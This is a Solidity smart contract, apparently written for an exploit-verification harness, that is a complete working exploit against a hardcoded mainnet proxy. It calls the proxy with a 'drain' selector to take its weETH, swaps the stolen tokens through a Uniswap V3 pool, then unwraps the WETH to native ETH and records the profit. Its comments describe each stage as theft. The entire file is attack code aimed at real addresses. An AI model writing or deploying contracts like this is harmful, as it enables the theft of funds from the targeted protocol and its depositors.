pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IWETH9 {
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 amount) external;
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract FlawVerifier {
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WEETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address internal constant POOL = 0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93;
    address internal constant TARGET_PROXY = 0x54Cd23460DF45559Fd5feEaaDA7ba25f89c13525;
    bytes4 internal constant DRAIN_SELECTOR = 0x03b79c24;
    uint160 internal constant MAX_SQRT_RATIO_MINUS_ONE = 1461446703485210103287273052203988822378723970341;

    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 ethBefore = address(this).balance;

        // Stage 1: directly call the proxy with selector 0x03b79c24 and set this
        // contract as the attacker-controlled recipient.
        (bool ok, ) = TARGET_PROXY.call(abi.encodeWithSelector(DRAIN_SELECTOR, address(this)));
        require(ok, "proxy-call-failed");

        // Stage 2: confirm the proxy released transferable weETH to this contract.
        uint256 drainedWeEth = IERC20Minimal(WEETH).balanceOf(address(this));
        require(drainedWeEth > 0, "no-weeth-drained");
        require(drainedWeEth <= uint256(type(int256).max), "swap-input-overflow");

        // Stage 3: swap the drained weETH through the Uniswap V3 pool, then pay
        // the callback with the same stolen weETH.
        IUniswapV3Pool(POOL).swap(
            address(this),
            false,
            int256(drainedWeEth),
            MAX_SQRT_RATIO_MINUS_ONE,
            bytes("")
        );

        // Stage 4: unwrap the received WETH into native ETH profit.
        uint256 wethBalance = IWETH9(WETH).balanceOf(address(this));
        require(wethBalance > 0, "no-weth-received");
        IWETH9(WETH).withdraw(wethBalance);

        _profitAmount = address(this).balance - ethBefore;
        require(_profitAmount > 0, "no-profit");
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == POOL, "invalid-callback-sender");
        require(amount0Delta <= 0, "unexpected-token0-debt");
        require(amount1Delta > 0, "unexpected-token1-debt");

        bool sent = IERC20Minimal(WEETH).transfer(POOL, uint256(amount1Delta));
        require(sent, "weeth-transfer-failed");
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}
